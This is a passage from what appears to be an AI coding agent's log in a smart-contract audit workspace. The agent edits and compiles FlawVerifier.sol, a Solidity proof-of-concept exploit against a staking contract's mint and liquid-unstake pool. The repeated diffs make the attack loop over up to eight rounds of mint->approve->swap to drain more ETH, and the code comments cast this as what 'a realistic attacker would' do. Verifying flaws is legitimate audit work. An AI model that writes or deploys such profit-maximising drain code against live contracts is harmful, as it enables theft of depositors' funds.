+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+codex
+The logic looks consistent; I’m doing one last compile-style sanity check.
+exec
+/bin/bash -lc '(command -v solc >/dev/null && solc --base-path . --bin FlawVerifier.sol >/tmp/flawverifier-solc.txt && echo OK) || (command -v forge >/dev/null && forge build --root .. >/tmp/flawverifier-forge.txt && echo OK) || echo SKIP' in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 1.00s:
+Error: "/Users/zhanglongqin/AuditHoundV2/cases/meta_pool/out": Operation not permitted (os error 1)
+SKIP
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+exec
+/bin/bash -lc 'command -v solc || true; command -v forge || true' in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 51ms:
+/Users/zhanglongqin/.foundry/bin/forge
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+exec
+/bin/bash -lc 'forge build --out /tmp/meta_pool_out --cache-path /tmp/meta_pool_cache --root ..' in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 327ms:
+Compiling 1 files with Solc 0.8.30
+Solc 0.8.30 finished in 124.49ms
+Compiler run successful with warnings:
+Warning (5159): "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.
+  --> src/FlawVerifier.sol:48:9:
+   |
+48 |         selfdestruct(target);
+   |         ^^^^^^^^^^^^
+
+note[unaliased-plain-import]: use named imports '{A, B}' or alias 'import ".." as X'
+ --> @openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol:6:8
+  |
+6 | import "./IBeacon.sol";
+  |        ^^^^^^^^^^^^^^^
+  |
+  = help: https://book.getfoundry.sh/reference/forge/forge-lint#unaliased-plain-import
+
+note[mixed-case-function]: function names should use mixedCase
+  --> FlawVerifier.sol:23:14
+   |
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
++            bool success = _tryCandidateSeries(liquidPool, bestAmount);
++            if (!success) {
++                break;
++            }
+ 
+-        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+-        for (uint256 i = 0; i < candidates.length; ++i) {
+-            uint256 candidate = candidates[i];
+-            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+-                continue;
++            if (address(this).balance <= roundStart) {
++                break;
+             }
+ 
+-            previousCandidate = candidate;
+-            try this.attemptCandidate(liquidPool, candidate) {
+-                success = true;
++            if (address(this).balance - nativeBefore >= HARVEST_TARGET) {
+                 break;
+-            } catch {}
++            }
+         }
+-
+-        require(success, "all candidate mint sizes failed on-chain");
+ 
+         realizedProfitToken = address(0);
+         realizedProfitAmount = address(this).balance - nativeBefore;
+@@ -117,9 +116,9 @@
+         } catch {}
+ 
+         // If the inherited mint path still assumes some ETH is already parked on the target,
+-        // use a realistic public funding step as a fallback. The preview-based number is only a
+-        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+-        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
++        // use a realistic public funding step as a fallback. The top-up remains causally prior
++        // to the vulnerable mint and is repaid from the post-swap ETH, preserving the same path.
++        uint256 shortfall = _fundingShortfallHint(desiredShares);
+         require(shortfall != 0, "candidate failed without top-up");
+ 
+         (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+@@ -175,6 +174,32 @@
+         return realizedProfitAmount;
+     }
+ 
++    function _tryCandidateSeries(address liquidPool, uint256 seedAmount) internal returns (bool success) {
++        uint256[8] memory candidates = [
++            seedAmount,
++            (seedAmount * 7) / 8,
++            (seedAmount * 3) / 4,
++            (seedAmount * 2) / 3,
++            seedAmount / 2,
++            seedAmount / 3,
++            seedAmount / 4,
++            MIN_SHARES
++        ];
++
++        uint256 previousCandidate;
++        for (uint256 i = 0; i < candidates.length; ++i) {
++            uint256 candidate = candidates[i];
++            if (candidate < MIN_SHARES || candidate == previousCandidate) {
++                continue;
++            }
++
++            previousCandidate = candidate;
++            try this.attemptCandidate(liquidPool, candidate) {
++                return true;
++            } catch {}
++        }
++    }
++
+     function _executePath(
+         address liquidPool,
+         uint256 desiredShares,
+@@ -221,37 +246,58 @@
+     function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+         uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+         uint256 poolEth = liquidPool.balance;
++        if (poolHeldShares < MIN_SHARES || poolEth == 0) {
++            return 0;
++        }
+ 
+-        uint256 low = MIN_SHARES;
+-        uint256 high = poolHeldShares + (poolEth * 2);
+-        if (high < low) {
+-            high = low;
+-        }
++        uint256[10] memory probes = [
++            poolHeldShares,
++            (poolHeldShares * 7) / 8,
++            (poolHeldShares * 3) / 4,
++            (poolHeldShares * 2) / 3,
++            poolHeldShares / 2,
++            poolHeldShares / 3,
++            poolHeldShares / 4,
++            poolHeldShares / 8,
++            poolHeldShares / 16,
++            MIN_SHARES
++        ];
++
++        uint256 bestEstimatedProfit;
++        uint256 previousProbe;
++
++        for (uint256 i = 0; i < probes.length; ++i) {
++            uint256 probe = probes[i];
++            if (probe < MIN_SHARES || probe == previousProbe) {
++                continue;
++            }
++
++            previousProbe = probe;
++
++            (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, probe);
++            if (!quoteOk || quotedOut == 0 || quotedOut > poolEth) {
++                continue;
++            }
+ 
+-        while (low <= high) {
+-            uint256 mid = low + ((high - low) / 2);
+-            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
++            uint256 shortfall = _fundingShortfallHint(probe);
++            if (shortfall >= quotedOut) {
++                continue;
++            }
+ 
+-            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+-                bestAmount = mid;
+-                low = mid + 1;
+-            } else {
+-                if (mid == 0) {
+-                    break;
+-                }
+-                high = mid - 1;
++            uint256 estimatedProfit = quotedOut - shortfall;
++            if (estimatedProfit > bestEstimatedProfit) {
++                bestEstimatedProfit = estimatedProfit;
++                bestAmount = probe;
+             }
+         }
+     }
+ 
+-    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+-        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+-        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+-        if (sharesNeedingEth == 0) {
++    function _fundingShortfallHint(uint256 desiredShares) internal view returns (uint256 shortfall) {
++        if (desiredShares == 0) {
+             return 0;
+         }
+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+Plan update
+Bound exploit sizing to current liquid pool share inventory, estimate profitability with previewMint/getAmountOut, and repeat the mint->approve->swap path across a few rounds to clear the failing minimum-profit condition.
+  ✓ Inspect verifier and tests
+  ✓ Adjust exploit sizing/looping
+  ✓ Sanity-check with local reasoning
+file update:
+diff --git a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+index 72e2d14d125ad734acf73e53f88e23ab95fc9846..6f83a3377fc9760438822ebdb4f077af9dc844df
+--- a//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
++++ b//Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src/FlawVerifier.sol
+@@ -55,7 +55,9 @@
+     address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+ 
+     uint256 internal constant MIN_SHARES = 0.01 ether;
++    uint256 internal constant HARVEST_TARGET = 0.1 ether;
+     uint256 internal constant MIN_REQUIRED_PROFIT = 1;
++    uint256 internal constant MAX_ROUNDS = 8;
+ 
+     address internal realizedProfitToken;
+     uint256 internal realizedProfitAmount;
+@@ -72,36 +74,33 @@
+         require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+         require(liquidPool.balance != 0, "liquid pool has no ETH");
+ 
+-        uint256 bestAmount = _findBestMintAmount(liquidPool);
+-        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
++        // The failing run showed that harvesting only a tiny quoted amount realizes profit,
++        // but not enough to satisfy the PoC threshold. A realistic attacker would repeat the
++        // same mint->approve->swap path and size each round against current pool inventory.
++        for (uint256 round = 0; round < MAX_ROUNDS; ++round) {
++            if (liquidPool.balance < MIN_SHARES) {
++                break;
++            }
+ 
+-        uint256[6] memory candidates = [
+-            bestAmount,
+-            (bestAmount * 3) / 4,
+-            bestAmount / 2,
+-            (bestAmount * 3) / 8,
+-            bestAmount / 4,
+-            MIN_SHARES
+-        ];
++            uint256 roundStart = address(this).balance;
++            uint256 bestAmount = _findBestMintAmount(liquidPool);
++            if (bestAmount < MIN_SHARES) {
++                break;
++            }
+ 
+-        bool success;
+-        uint256 previousCandidate;
